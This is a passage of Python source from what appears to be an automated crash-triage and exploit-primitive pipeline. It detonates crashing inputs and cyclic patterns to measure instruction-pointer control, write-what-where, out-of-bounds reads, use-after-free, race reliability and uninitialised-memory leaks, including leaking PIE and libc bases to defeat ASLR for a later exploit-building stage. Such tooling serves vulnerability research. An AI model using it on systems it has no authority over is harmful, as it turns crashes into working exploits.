    for label, data in _probe_variants(orig, pre, post)[1:]:
        rep = _detonate_for_report(ctx, target, exe, mode, base_argv, data, timeout)
        if rep:
            obs.append((label, rep))
    prim = primitive.lifetime_primitive(obs)
    if prim is not None:
        ctx.emit("primitive.lifetime", payload={
            "class": prim["sanitizer_class"], "access": prim.get("access"),
            "region_offset_min": prim.get("region_offset_min"),
            "region_offset_max": prim.get("region_offset_max"),
            "region_size_min": prim.get("region_size_min"),
            "region_size_max": prim.get("region_size_max"),
            "offset_controlled": prim["offset_controlled"],
            "size_controlled": prim["size_controlled"],
            "controlled": prim["confirmed"], "used_at": prim.get("used_at"),
            "freed_at": prim.get("freed_at"), "allocated_at": prim.get("allocated_at"),
            "variants_detonated": len(obs), "observations": prim["observations"][:10]})
    return prim


def _quantity_primitive(ctx, target, exe, mode, base_argv, orig, pre, post, timeout, first=None):
    """Step 2d: the verdict for a class whose report states a MAGNITUDE and no access.

    Same experiment again, third question. A 35 TB allocation request, a leak, a negative length,
    an out-of-bounds index: none of these describes an access past an object or a use of a dead
    one, so steps 2b and 2c both decline and the ladder used to end on "no instruction-pointer /
    memory primitive found" -- an answer to a question nobody asked about this defect. What the
    report states is a number, and the question is whether the attacker picks it.
    """
    first = first or _detonate_for_report(ctx, target, exe, mode, base_argv, orig, timeout)
    if not first or first.get("class") not in primitive.QUANTITY_CLASSES:
        return None
    if first.get("quantity") is None:
        return None                                      # the class fits; the report has no number
    ctx.progress(msg=f"{first['class']}: varying the input to see whether the "
                     f"{first.get('quantity_name') or 'magnitude'} is attacker-controlled")
    obs = [("orig", first)]
    for label, data in _probe_variants(orig, pre, post)[1:]:
        rep = _detonate_for_report(ctx, target, exe, mode, base_argv, data, timeout)
        if rep:
            obs.append((label, rep))
    prim = primitive.quantity_primitive(obs)
    if prim is not None:
        ctx.emit("primitive.quantity", payload={
            "class": prim["sanitizer_class"], "quantity_name": prim["quantity_name"],
            "quantity_min": prim["quantity_min"], "quantity_max": prim["quantity_max"],
            "quantity_limit": prim.get("quantity_limit"),
            "effect_kind": prim["effect_kind"], "effect_status": prim["effect_status"],
            "controlled": prim["confirmed"], "variants_detonated": len(obs),
            "observations": prim["observations"][:10]})
    return prim


def _is_race(rep) -> bool:
    return bool(rep) and rep.get("sanitizer") == primitive.TSAN \
        and rep.get("class") in primitive.RACE_CLASSES


def _race_primitive(ctx, target, exe, mode, base_argv, orig, timeout, first=None,
                    pre=b"", post=b"", detonate=None):
    """Step 2e: the concurrency verdict, measured by REPEATING the same input.

    The other three verdicts vary the input and watch a number move. A race's outcome does not
    depend on the bytes, so that experiment says nothing about it -- which is why this stage used
    to decline the whole family by name. The property that IS measurable, and the one whoever acts
    on the finding needs, is how often the same input shows the defect: a 1-in-8 race is real and
    needs a looping reproducer, and a fault that reproduces on none of the repeats is a fact about
    OUR evidence that has to be said out loud rather than shipped as a one-shot PoC.
    """
    # One seam, so the stage's own logic can be tested without a binary whose flakiness is the
    # thing under test: a race fixture that reports intermittently ON PURPOSE is a flaky test.
    det = detonate or (lambda data: _detonate_for_report(ctx, target, exe, mode, base_argv,
                                                         data, timeout))
    first = first or det(orig)
    if not _is_race(first):
        return None
    ctx.progress(msg=f"{first['class']}: repeating the SAME input {primitive.RACE_RUNS} times to "
                     f"measure how often it reports")
    obs = [("run1", first)]
    for i in range(2, primitive.RACE_RUNS + 1):
        if ctx.should_cancel():
            break
        obs.append((f"run{i}", det(orig)))
    prim = primitive.race_primitive(obs)
    if prim is not None and prim.get("intermittent"):
        # WINDOW WIDENING, and only here. A defect that already reports on every run has no
        # window left to widen, and measuring a rate costs a process per run -- so the most
        # expensive experiment in this stage is spent only where its answer can change what the
        # operator does. A 1-in-8 defect is a curiosity to whoever has to reproduce it; the same
        # defect at 6-of-6 is a tool, and the difference is an input property.
        variants = _probe_variants(orig, pre, post)[1:][:primitive.WIDEN_VARIANTS]
        if variants:
            ctx.progress(msg=f"{prim['hits']}/{prim['runs']} baseline: measuring whether the "
                             f"input can WIDEN the window ({len(variants)} variants x "
                             f"{primitive.WIDEN_RUNS} runs)")
        trials, by_label = [], {}
        for label, data in variants:
            if ctx.should_cancel():
                break
            hits = 0
            for _ in range(primitive.WIDEN_RUNS):
                hits += 1 if _is_race(det(data)) else 0
            trials.append((label, hits, primitive.WIDEN_RUNS))
            by_label[label] = data
        w = primitive.widening_verdict(prim["hits"], prim["runs"], trials)
        prim["widening_trials"] = [{"variant": a, "hits": b, "runs": c} for a, b, c in trials]
        if w:
            prim["widening"] = w
            prim["retries"] = w["retries"]          # a reliable input needs far fewer attempts
            # The BYTES that made it reliable, for the bundle to ship. Popped by the caller
            # before anything serialises `prim` -- raw bytes are not JSON.
            prim["widened_input"] = by_label[w["variant"]]
    if prim is not None:
        ctx.emit("primitive.race", payload={
            "class": prim["sanitizer_class"], "runs": prim["runs"], "hits": prim["hits"],
            "rate": prim["rate"], "intermittent": prim["intermittent"],
            "retries": prim["retries"], "accesses": prim["accesses"],
            "race_sites": prim["race_sites"], "location": prim.get("location"),
            "widening": prim.get("widening"),
            "widening_trials": prim.get("widening_trials"),
            "observations": prim["observations"][:10]})
    return prim


#: Bytes of marker planted in the input for the residue experiment. Long enough that finding it
#: in the output means something (a short run matches ordinary filler), short enough to survive
#: being placed inside a structured input's body.
_RESIDUE_MARKER = bytes.fromhex("5ec0de15ca1dbeef") * 2


def _uninit_primitive(ctx, target, exe, mode, base_argv, orig, pre, post, timeout,
                      first=None, target_bytes=b""):
    """Step 2f: the uninitialised-value verdict, or None when this is not that kind of report.

    Two experiments, because the report leaves two different questions open.

    HOW MUCH escapes is the family's shared experiment: vary the input, watch the volume move.

    WHOSE BYTES escape is the one this class actually turns on, and it is answerable only because
    of a measured fact about MSan: the interceptor reports the undefined bytes and then performs
    the write, so the residue is on the run's own stdout. The experiment plants a distinctive
    marker in the input and looks for it there. On the shape this defect usually takes -- one
    call reads input into its frame, a later call at the same depth reads its own frame
    uninitialised -- the marker comes straight back out, and that is the attacker choosing the
    contents of memory the program never wrote.

    Note which binary this runs on. It is the MSan build, deliberately: the ASan build zeroes a
    fresh frame and fills a fresh heap allocation with 0xbe, so a residue verdict taken from it
    measures the sanitizer and not the program **[measured]**. `residue_verdict` detects that
    anyway -- a uniform block is reported as `filled` and claims nothing -- so the honest answer
    survives being run on the wrong build; it just stops being informative.
    """
    first = first or _detonate_for_report(ctx, target, exe, mode, base_argv, orig, timeout)
    if (not first or first.get("class") not in primitive.UNINIT_CLASSES
            or first.get("sanitizer") != primitive.MSAN):
        return None
    escaped = first.get("escape_bytes") is not None
    ctx.progress(msg=("uninitialised memory reached `%s`: measuring the volume and whose bytes "
                      "they are" % first.get("escape_fn")) if escaped else
                 "uninitialised value used internally: checking whether it ever leaves")
    obs = [("orig", first)]
    for label, data in _probe_variants(orig, pre, post)[1:]:
        rep = _detonate_for_report(ctx, target, exe, mode, base_argv, data, timeout)
        if rep:
            obs.append((label, rep))

    # The residue experiment. Only where something escaped -- with nothing leaving the process
    # there is no disclosed byte to attribute, and a run spent on it would answer no question.
    res = None
    if escaped:
        body = orig[len(pre):len(orig) - len(post)] if (pre or post) else orig
        marker = _RESIDUE_MARKER
        if len(body) >= len(marker):
            # Planted at the START of the body, where a program that reads input into a buffer
            # puts it. Padded back to the original length so the input's structure (and any
            # length field that describes it) still holds.
            planted = pre + marker + body[len(marker):] + post
        else:
            planted = pre + marker + post
        rep2, out2 = _detonate_capturing(ctx, target, exe, mode, base_argv, planted, timeout)
        off = int((rep2 or first).get("escape_offset") or 0)
        # `target_bytes` is the binary actually being detonated (the MSan build, resolved by
        # `replay_exe_for`) -- an image base is corroborated against the image it came from.
        res = primitive.residue_verdict(bytes(out2 or b"")[off:], marker,
                                        target_bytes=target_bytes or b"",
                                        word=8 if (target.bits or 64) >= 64 else 4,
                                        endian="big" if target.endianness == "big" else "little")
        if rep2:
            obs.append(("marker", rep2))

    prim = primitive.uninit_primitive(obs, residue=res)
    if prim is not None:
        ctx.emit("primitive.uninit", payload={
            "class": prim["sanitizer_class"], "escaped": prim["escaped"],
            "escape_fn": prim.get("escape_fn"), "volume_min": prim.get("volume_min"),
            "volume_max": prim.get("volume_max"), "origin": prim.get("origin"),
            "origin_site": prim.get("origin_site"), "residue": prim.get("residue"),
            "marker_offset": prim.get("marker_offset"), "pie_base": prim.get("pie_base"),
            "controlled": prim["confirmed"], "variants_detonated": len(obs),
            "observations": prim["observations"][:10]})
    return prim


def primitive_stage(ctx) -> dict:
    import sys
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("poc_primitive requires a target_id")
    p = ctx.params or {}
    input_sha = p.get("input_sha")
    if not input_sha:
        raise ValueError("poc_primitive requires params.input_sha (a crashing input)")
    timeout = float(p.get("timeout", 8))

    # A substrate that owns the instruction pointer cannot be asked for L2, and the reason
    # matters: `target.arch` holds the RUNTIME's name for a managed target ("cil", "jvm",
    # "cpython", "wasm"), so the cross-arch test below fired for every one of them and the
    # decline read "no qemu gdbstub register layout (host x86-64)" -- naming a missing TOOL for
    # something no tool can do. `known()` first, because an empty file_type means triage has not
    # run yet, not that nothing can run this.
    if substrate.known(target.file_type) and not substrate.supports_ip_control(target.file_type):
        note = substrate.no_ip_control_reason(target.file_type)
        ctx.emit("primitive.done", payload={"primitive": None, "supported": False, "note": note})
        ctx.progress(pct=100, msg="L2 is not a claim this substrate can support")
        return {}

    host = sandbox.host_arch()
    emulated = substrate.foreign_cpu(target.arch, target.file_type, host)
    if emulated and not qemu_gdb.supported(target.arch):
        ctx.emit("primitive.done", payload={"primitive": None, "supported": False,
                 "note": f"L2 for cross-arch {target.arch}: no qemu gdbstub register layout "
                         f"(host {host})"})
        ctx.progress(pct=100, msg="L2 not supported for this cross-arch target")
        return {}

    # AFTER the guards above, not before: discovery reads the content store and the
    # target's import table, which is wasted work on a target this stage is about to
    # refuse outright -- and it made the stage touch `ctx.content` before it had decided
    # anything, so a managed target could not even be declined without one.
    mode, base_argv, mode_why = how_to_feed(ctx.conn, target, input_sha, p,
                                            content=ctx.content)

    orig = ctx.content.get_bytes(input_sha)
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    # Staged under the name the image dispatches on (busybox and any other multi-call
    # binary refuse every input as `target.bin`): see invocation.staged_name.
    exe = ctx.scratch() / _staged_name(ctx, target)
    ctx.content.stage_target(target, exe.parent, exe.name)
    exe.chmod(0o755)

    # A Windows PE runs under Wine, not ptrace: the whole machinery below (replay harnesses,
    # sanitizer twins, ptrace/qemu captures, siginfo-based address verdicts, Ghidra stack-frame
    # seeding) assumes an ELF the host can trace, and none of it can follow Win64 state through
    # wineserver -- so for every PE this stage ran to the end and produced nothing. The PE L2 path
    # is self-contained: it drives Wine with WINEDEBUG=+seh and recovers the control offset from
    # the guest register dump + walked SEH frames. See `_pe_ip_primitive`.
    if (target.file_type or "").lower() == "pe":
        return _pe_ip_primitive(ctx, target, exe, target_bytes, mode, base_argv, orig, timeout)

    # Detonate the binary that ACTUALLY crashed. `build_poc` already replays a libFuzzer crash
    # against the harness it was found in; this stage did not, so it detonated a tool that never
    # calls the vulnerable path, the cyclic pattern did not fault, and the stage reported "no L2
    # primitive" for a defect it had simply never reached. One finding cannot be at L1 because
    # two stages disagree about what the target is.
    _harness, _kind = replay_exe_for(ctx, target, input_sha)
    if _harness:
        exe = ctx.scratch() / "harness.bin"
        exe.write_bytes(_harness)
        exe.chmod(0o755)
        target_bytes = _harness                          # the bundle must ship the HARNESS
        if _kind == "libfuzzer":
            mode, base_argv = "file", ["@@"]
            mode_why = ("detonated against the libFuzzer harness the crash was found in "
                        "(the ingested binary need not call the vulnerable path)")
        else:
            # KEEP the discovered channel. A sanitizer-variant build is the same program, and
            # forcing a file argument on one that reads stdin runs it with no input: measured on
            # an MSan uninitialised-memory disclosure, where the defect still reported (it needs
            # no input) and so every experiment that varies the input silently had nothing to
            # vary -- the volume could not move and the planted marker never reached the program.
            mode_why = ("detonated against the sanitizer build that reported it (the same "
                        "program and the same input channel)")
        ctx.emit("primitive.harness", payload={"bytes": len(_harness), "mode": mode,
                                               "kind": _kind, "why": mode_why})

    # TWO BINARIES, TWO JOBS. The sanitizer build is the INSTRUMENT: it names the defect's class
    # and its file:line, and nothing else can. It is also useless for the instruction-pointer
    # experiment, and step 2b below already says why -- ASan aborts inside its own runtime, so
    # the fault-time pc belongs to the reporting machinery, the cyclic word is nowhere in the
    # registers and there is no faulting access to read. The workaround was to add verdicts that
    # need no registers (2b-2f), which is right as far as it goes and leaves the rung that
    # matters most unreachable: a source drop could never produce an IP-control offset, so
    # `build_exploit` inherited nothing and fell back to its own bare cyclic -- which cannot
    # fault on a structured input at all.
    #
    # So run the CAPTURE against the uninstrumented build of the same source when there is one,
    # and keep the REPORT on the instrumented build. The two answer different questions and must
    # not be the same binary. Not applied to a harness (`_harness`): a libFuzzer harness or a
    # TSan/MSan variant IS the program that faulted, and there is no plain twin of it.
    cap_exe, cap_bytes, cap_plain = exe, target_bytes, False
    if not _harness:
        _plain = plain_build_bytes(ctx, target)
        if _plain is not None and aflpp.is_sanitizer_build(target_bytes):
            cap_exe = ctx.scratch() / "plain" / "target.bin"
            cap_exe.parent.mkdir(parents=True, exist_ok=True)
            cap_exe.write_bytes(_plain)
            cap_exe.chmod(0o755)
            cap_bytes, cap_plain = _plain, True
            ctx.emit("primitive.capture_build", payload={
                "build": "uninstrumented", "bytes": len(_plain),
                "note": "the control-offset experiments run against the uninstrumented build of "
                        "this source; the sanitizer build aborts inside its own runtime, so the "
                        "cyclic marker never reaches a register. The defect's class and site "
                        "still come from the sanitizer build"})

    # Static RE corroboration: recovered stack-buffer sizes predict IP-control offsets.
    word = 8 if (target.bits or 64) >= 64 else 4
    endian = "big" if target.endianness == "big" else "little"
    frames = _hydrate_frames(ctx, target.id, target)
    offset_candidates = primitive.frame_offset_candidates(frames, word)
    if offset_candidates:
        ctx.emit("primitive.static", payload={"candidates": offset_candidates[:8]})

    need = (max((c["offset"] for c in offset_candidates), default=0) + word + 64)
    length = min(max(len(orig) * 2, need, 256), 4096)
    helper = materialize_helper()
    try:
        # Was this crash found under the guard-page allocator? Then every detonation here needs
        # it too, or the input is silent and the stage concludes "did not fault". The run that
        # found it recorded the oracle in its isolation tag, which is the same field
        # `replay_exe_for` reads to tell a libFuzzer harness from the ingested binary.
        _found_guarded = sandbox.GUARD_PAGE_TAG in (_crash_isolation(ctx, target, input_sha) or "")
        if _found_guarded:
            ctx.progress(msg="this crash was found under the guard-page allocator, so the "
                             "captures preload it too")

        def _capture_for(m, which=None):
            # `which` picks the binary -- see "TWO BINARIES, TWO JOBS" above. Defaults to
            # whichever one the sweep below settled on.
            which = which or cap_exe
            if emulated:
                return make_qemu_capture(which, target.arch, m, base_argv, timeout,
                                         endianness=target.endianness, bits=target.bits)
            return make_capture(ctx, helper, which, m, base_argv, timeout, sys.executable,
                                guard_page=_found_guarded)

        # Structure-preserving framing: a structured input (a config `name=<AAAA...>`, a packet)
        # only faults when the bytes AROUND the overflow stay intact -- the smash is the long filler
        # run, not the whole input. The FUZZER's crashing input is often messy (dictionary tokens +
        # a trailing run), so first MINIMIZE it to its essential crashing shape; then the longest
        # run is the real filler and the prefix/suffix are the true structure. The cyclic (and the
        # control marker) then go exactly where the filler was. Unstructured inputs minimize to a
        # single run and frame as a whole (b"", b""), i.e. exactly the old behaviour.
        min_cap = _capture_for(mode)

        def _still_faults(b):
            c = min_cap(b)
            return bool(c.get("ok") and c.get("signal_name"))
        # Native only: minimization is up to `cap` detonations, cheap under ptrace but far too slow
        # over a qemu gdbstub (each exec is a full emulated run), where it would blow the stage's
        # budget. Cross-arch keeps the raw crash input, exactly as before.
        if len(orig) > 64 and not emulated:
            ctx.progress(msg=f"minimizing the {len(orig)}-byte crash to its essential shape")
            mini, _mx = minimize(_still_faults, orig, cap=120)
            if len(mini) < len(orig) and _still_faults(mini):
                ctx.emit("primitive.minimized", payload={"from": len(orig), "to": len(mini)})
                orig = mini
        _pre, _post = _overflow_frame(orig)
        _run = filler_run_len(orig)

        def frame_relen(payload):
            # The length field in the prefix follows the payload's length: see relength_prefix.
            return relength_prefix(_pre, _run, len(payload)) + payload + _post

        def frame_plain(payload):
            return _pre + payload + _post
        # The length-aware framing is an OFFER, exactly like the framing itself: the field it
        # rewrites is the last number before the filler, and "at least as large as the filler it
        # precedes" is evidence rather than proof -- a `count=9999` that happens to sit in front
        # of a short run would be rewritten too. It only goes out when it CHANGES the prefix, and
        # the plain framing follows it, so a wrong guess costs one detonation.
        _relen_differs = relength_prefix(_pre, _run, 1) != _pre
        frame = frame_relen if _relen_differs else frame_plain

        ctx.progress(msg=f"detonating {length}-byte cyclic pattern under "
                         + (f"qemu-{target.arch} gdbstub" if emulated else "ptrace"))
        # Try the mode we believe in, then the others. A crashing input fed the wrong way
        # does not fault, and reporting that as "no L2 primitive" turns a wrong setup into
        # what reads as a real negative result.
        pattern = primitive.cyclic(length)
        tried = []
        # Prefer the structure-preserving framing (keeps a `name=` prefix etc.); fall back to the
        # raw pattern so an input whose longest run is NOT the overflow still works exactly as
        # before. `active_frame` is whichever reproduced the fault, reused for the confirm step.
        identity = (lambda b: b)              # noqa: E731
        framings = ([frame_relen] if _relen_differs else [])
        framings += ([frame_plain] if (_pre or _post) else []) + [identity]
        active_frame = identity
        cap0 = {}
        # Sweep the UNINSTRUMENTED build first and the instrumented one second, because they
        # fault for different reasons and only one of them can answer each question. The plain
        # build faults where the program really breaks -- a corrupted return, a wild store -- and
        # that is the only place the cyclic marker is visible in a register. The sanitizer build
        # faults EARLIER, inside its own runtime, on defects the plain build survives silently
        # (an over-read, a use-after-free), which is what the class verdicts in 2b-2f read.
        #
        # Taking the plain build ALONE was measured to be worse than either: the bare cyclic does
        # not fault on it, so the stage returned "cyclic pattern did not fault" and never reached
        # the class verdicts -- an out-of-bounds read that had been producing a proved ASLR
        # defeat produced nothing at all. Falling back keeps every verdict that worked before and
        # adds the control offset that none of them could reach.
        for _which, _bytes, _is_plain in ([(cap_exe, cap_bytes, True)] if cap_plain else []) + [
                (exe, target_bytes, False)]:
            for fr in framings:
                # The FRAMED pattern decides whether paced delivery is worth trying: the bare
                # cyclic has no field boundaries, but `b"go\n" + cyclic + b"\n"` has three, and
                # it is the framed bytes that get delivered.
                for m in sweep_modes(mode, fr(pattern)):
                    capture = _capture_for(m, _which)
                    cap0 = capture(fr(pattern))
                    if m not in tried:
                        tried.append(m)
                    if cap0.get("ok") and cap0.get("signal_name"):
                        active_frame, mode = fr, m
                        break
                if cap0.get("ok") and cap0.get("signal_name"):
                    break
            if cap0.get("ok") and cap0.get("signal_name"):
                cap_exe, cap_bytes, cap_plain = _which, _bytes, _is_plain
                if cap_plain:
                    ctx.progress(msg="the cyclic faults on the uninstrumented build, so the "
                                     "control offset is measurable")
                break
            if _is_plain:
                ctx.progress(msg="the uninstrumented build does not fault on a bare cyclic; "
                                 "falling back to the sanitizer build for a class verdict")
        frame = active_frame                       # confirm uses the framing that actually faulted
        # ...and build_exploit inherits it. An offset is only meaningful against the framing it
        # was measured in, and L3 re-derives its own from whatever crash input it is handed:
        # `_overflow_frame` needs a long single-byte filler run to see any structure, which a
        # fuzzer blob often lacks even when the target genuinely needs a `name=` prefix. This
        # swept framings against the LIVE target and kept the one that faulted, so record it.
        _frame_bytes = ((_pre, _post) if active_frame is not identity else (b"", b""))
        _frame_relength = active_frame is frame_relen
        capture = _capture_for(mode)
        if not cap0.get("ok") or not cap0.get("signal_name"):
            # A cyclic pattern establishes CONTROL OF THE RETURN ADDRESS, and a read-class defect
            # has no return address to control -- so this exit was the end of the chain for every
            # out-of-bounds read in a real binary, and for every defect behind a parser that
            # rejects a De Bruijn pattern at its header (busybox's lzma decoder: the crash is 22
            # bytes with a 9-byte filler run, below `_overflow_frame`'s threshold, so the pattern
            # replaced the whole input and the target stopped faulting).
            #
            # The crashing input itself still faults. Ask the question that fits the evidence we
            # have: does the attacker choose the ADDRESS?
            ctx.progress(msg="cyclic did not fault; measuring whether the input chooses the "
                             "faulting address")
            # Native only: the experiment reads `fault_addr`, which comes from ptrace's
            # siginfo. A qemu gdbstub capture has registers and no siginfo, and the emulated
            # path has its own policy for what it can conclude.
            _av, _demo, _dcap, _dmode = (None, b"", {}, "")
            if not emulated:
                _av, _demo, _dcap, _dmode = _address_verdict(
                    ctx, lambda m: _capture_for(m), sweep_modes(mode, orig),
                    orig, target.arch or "x86-64",
                    siblings=_address_siblings(ctx, target, input_sha),
                    endianness=target.endianness)
            if _av and _av.get("confirmed"):
                # L2 -> L3: a controlled READ is only a step if its bytes come back. Steer the
                # lever into mapped memory and let the existing leak machinery judge what the
                # program printed; `build_exploit` picks the recipe up from `disclosure`.
                _disc = _address_disclosure(ctx, target, _dmode or mode, base_argv, orig, _av,
                                            timeout)
                if _disc:
                    _av["disclosure"] = {k: _disc[k] for k in
                                         ("proved", "rule", "pie_base", "libc_base", "canary",
                                           "distinct", "disclosed_bytes", "note", "input_sha", "code_ptrs")
                                         if k in _disc}
                return _finalize(ctx, target, target_bytes, _dmode, base_argv, _dcap, _demo,
                                 _av, True, {"input_modes_tried": tried})
            ctx.emit("primitive.done", payload={
                "primitive": None, "supported": True, "input_modes_tried": tried,
                "address_verdict": _av,
                "note": ("cyclic pattern did not fault via any of " + ", ".join(tried)
                         + (" (uninstrumented build)" if cap_plain else "")
                         + ": " + str(cap0.get("reason", ""))
                         + (" " + str(_av.get("note")) if _av else ""))})
            ctx.progress(pct=100, msg=((_av.get("effect_kind") + ": " + _av["note"][:60])
                                       if _av else
                                       "no fault under cyclic pattern (tried %s)"
                                       % ", ".join(tried)))
            return {}

        # The faulting INSTRUCTION first: it decides whether the pc is where control went (a
        # `ret`) or where control was HANDED OVER (an indirect `call` through a register), and
        # the recovery needs to know which.
        # The target's byte order (and Thumb state, which the emulated capture reports): without
        # them disasm_one falls back to the arch's default, so a little-endian MIPS fault decoded
        # as big-endian -- a different instruction, and the wrong memory operand below.
        disasm = rootcause.disasm_one(bytes.fromhex(cap0.get("pc_bytes", "")),
                                      target.arch or host,
                                      cap0.get("endianness") or target.endianness,
                                      bool(cap0.get("thumb")))
        mnem = (disasm or "").split()[0] if disasm else ""
        rec = primitive.recover_ip_offset(cap0, length, endian=endian, word=word, disasm=disasm)
        regs = primitive.controlled_registers(cap0, length, endian=endian, word=word)

        # 1) instruction-pointer control. Trust the dynamic slot heuristic only when the fault
        # is actually at a return (else a fuzzed buffer of stack locals looks like a retaddr); a
        # cyclic pc, or a controlled return-address register (lr/x30/$ra on link-register ABIs),
        # is a hijack and always trusted. We then CONFIRM by placing the marker at the control
        # slot -- and confirmation, not the raw heuristic, decides the reported offset, so an
        # off-by-a-word recovery self-corrects.
        #
        # Build the confirm candidates in priority order:
        #   - the dynamic offset (when trusted);
        #   - on an LSB-masking ISA, its alias sibling (see _LSB_MASKED_PC): the captured PC
        #     is `value & ~1`, whose cyclic window can alias one word early -- searching
        #     `(pc | 1)` restores the exact slot;
        #   - the static-frame predictions (also the sole source when the fault isn't a ret).
        trusted = rec is not None and (rec[1] in ("pc",) + primitive.ra_regs(cap0)
                                       or str(rec[1]).startswith("reg:")
                                       or mnem in ("ret", "retq", "retn"))
        confirm_cands = []                         # (offset, source, static_match, fp_slack)
        if trusted:
            off0, src0 = rec
            sm0, sl0 = primitive.match_frame_candidate(off0, offset_candidates, word)
            confirm_cands.append((off0, src0, sm0, sl0))
            if (target.arch or "") in _LSB_MASKED_PC and src0 == "pc":
                alt = primitive.cyclic_find(
                    primitive._reg_window((cap0.get("pc") or 0) | 1, word, endian, 4), length, 4)
                if alt != -1 and alt != off0:
                    sm1, sl1 = primitive.match_frame_candidate(alt, offset_candidates, word)
                    confirm_cands.append((alt, "pc(lsb-masked)", sm1, sl1))
        for off, c, fp_slack in primitive.seed_offsets(offset_candidates, word, length):
            confirm_cands.append((off, "static-frame", c, fp_slack))

        seen_off = set()
        for off, source, static_match, fp_slack in confirm_cands:
            if off in seen_off:
                continue
            seen_off.add(off)
            ctx.progress(msg=f"confirming IP-control at offset {off} ({source})")
            control = frame(primitive.control_input(off, length, word, endian))
            if not primitive.marker_confirmed(capture(control), word, endian):
                continue
            prim = {"type": "instruction-pointer-control", "offset": off, "source": source,
                    "marker": primitive._ip_marker(word), "observed_pc": cap0.get("pc", 0),
                    "confirmed": True, "registers": regs,
                    "static_offset": static_match, "static_candidates": offset_candidates}
            if _pre or _post:                          # structured input: record the framing
                prim["prefix"] = _pre.hex()
                prim["suffix"] = _post.hex()
            extra = f"instruction-pointer control at offset {off} ({source})"
            if static_match:
                extra += (f"; corroborated by static stack frame -- {static_match['size']}-byte"
                          f" buffer {static_match['buffer']}{_slack_txt(fp_slack)}"
                          f" = offset {off}")
            return _finalize(ctx, target, cap_bytes, mode, base_argv, cap0, control,
                             prim, True, extra, frame=_frame_bytes, relength=_frame_relength)

        # 1c) nothing confirmed -- if we had a trusted dynamic offset, still report it as an
        # unconfirmed IP-control primitive (the crash reproduces; the marker just didn't pin).
        if trusted:
            offset, source = rec
            static_match, fp_slack = primitive.match_frame_candidate(offset, offset_candidates,
                                                                     word)
            control = frame(primitive.control_input(offset, length, word, endian))
            prim = {"type": "instruction-pointer-control", "offset": offset, "source": source,
                    "marker": primitive._ip_marker(word), "observed_pc": cap0.get("pc", 0),
                    "confirmed": False, "registers": regs,
                    "static_offset": static_match, "static_candidates": offset_candidates}
            extra = f"instruction-pointer control at offset {offset} ({source})"
            if static_match:
                extra += (f"; corroborated by static stack frame -- {static_match['size']}-byte"
                          f" buffer {static_match['buffer']}{_slack_txt(fp_slack)}"
                          f" = offset {offset}")
            return _finalize(ctx, target, cap_bytes, mode, base_argv, cap0, control,
                             prim, False, extra, frame=_frame_bytes, relength=_frame_relength)

        # 2) memory primitive (write-what-where / controlled read at a faulting mem access)
        memp = primitive.analyze_memory_primitive(cap0, length, disasm, endian=endian,
                                                  word=word, arch=target.arch or host)
        if memp is not None:
            ctx.progress(msg=f"{memp['type']} at addr offset {memp['addr_offset']}; confirming")
            control = frame(primitive.two_marker_input(memp["addr_offset"], memp.get("value_offset"),
                                                       length, word=word, endian=endian))
            addr_ok, value_ok = primitive.memory_primitive_confirmed(capture(control), memp,
                                                                     word=word, endian=endian)
            confirmed = addr_ok and (value_ok or memp["type"] != "write-what-where")
            reg_map = {memp["addr_reg"]: memp["addr_offset"]}
            if memp.get("value_reg") and memp.get("value_offset") is not None:
                reg_map[memp["value_reg"]] = memp["value_offset"]
            prim = {"type": memp["type"], "offset": memp["addr_offset"],
                    "marker": primitive._ip_marker(word), "observed_pc": cap0.get("pc", 0),
                    "confirmed": confirmed, "registers": reg_map, "access": memp["access"],
                    "value_offset": memp.get("value_offset"), "disasm": disasm}
            extra = (f"{memp['type']}: {memp['access']} through attacker-controlled address "
                     f"(offset {memp['addr_offset']}"
                     + (f", value offset {memp['value_offset']}"
                        if memp.get("value_offset") is not None else "") + f") via `{disasm}`")
            return _finalize(ctx, target, cap_bytes, mode, base_argv, cap0, control,
                             prim, confirmed, extra, frame=_frame_bytes, relength=_frame_relength)

        # 2b) NOTHING in the registers -- because on a sanitizer build there is nothing in the
        # registers to find. ASan aborts inside its own runtime, so the fault-time pc belongs to
        # the reporting machinery, `recover_ip_offset` sees no cyclic word and
        # `analyze_memory_primitive` has no faulting access to read. The stage fell through to
        # step 3 and said "crash reproduced but no controllable primitive found", which is
        # technically true and completely empty: libtiff's `putRGBcontig8bittile` heap
        # out-of-bounds READ -- a real, reachable, demonstrable information disclosure -- got no
        # verdict at all, because the only verdicts on offer were about controlling the
        # instruction pointer.
        #
        # The primitive for this class is in the REPORT, and the experiment is to vary the input
        # and watch the distance past the end of the object move.
        _first = None
        if not emulated:
            # ONE detonation for all three sanitizer verdicts and for the decline below. Each
            # used to run its own copy to decide whether it applied, so the same input was
            # detonated four times before any variant was tried -- four sandbox runs out of a
            # budget that buys ten.
            _first = _detonate_for_report(ctx, target, exe, mode, base_argv, orig, timeout)
            prim = _oob_primitive(ctx, target, exe, mode, base_argv, orig, _pre, _post,
                                  timeout, first=_first)
            if prim is not None:
                control = frame(orig[len(_pre):len(orig) - len(_post)] if (_pre or _post)
                                else orig)
                extra = primitive.oob_effect(prim)
                return _finalize(ctx, target, target_bytes, mode, base_argv, cap0, control,
                                 prim, bool(prim.get("confirmed")), extra, frame=_frame_bytes, relength=_frame_relength)

            # 2c) the same reasoning, one bug class further on. A use-after-free and a double
            # free are the two defects this link had NO verdict for -- the distance experiment
            # does not apply to a dead object -- so both got "crash reproduced but no
            # instruction-pointer / memory primitive found" on every sanitizer build.
            prim = _lifetime_primitive(ctx, target, exe, mode, base_argv, orig, _pre, _post,
                                       timeout, first=_first)
            if prim is not None:
                control = frame(orig[len(_pre):len(orig) - len(_post)] if (_pre or _post)
                                else orig)
                extra = primitive.lifetime_effect(prim)
                return _finalize(ctx, target, target_bytes, mode, base_argv, cap0, control,
                                 prim, bool(prim.get("confirmed")), extra, frame=_frame_bytes, relength=_frame_relength)

            # 2e) a concurrency defect, whose experiment is a REPEAT rather than a variation.
            prim = _race_primitive(ctx, target, exe, mode, base_argv, orig, timeout,
                                   first=_first, pre=_pre, post=_post)
            if prim is not None:
                # The bundle ships the input that makes the defect RELIABLE where the experiment
                # found one -- a reproducer for a 1-in-8 race should not be the 1-in-8 input when
                # a 6-of-6 one is in hand. Popped here because `prim` is serialised downstream
                # and raw bytes are not JSON.
                _widened = prim.pop("widened_input", None)
                control = _widened if _widened else frame(
                    orig[len(_pre):len(orig) - len(_post)] if (_pre or _post) else orig)
                extra = primitive.race_effect(prim)
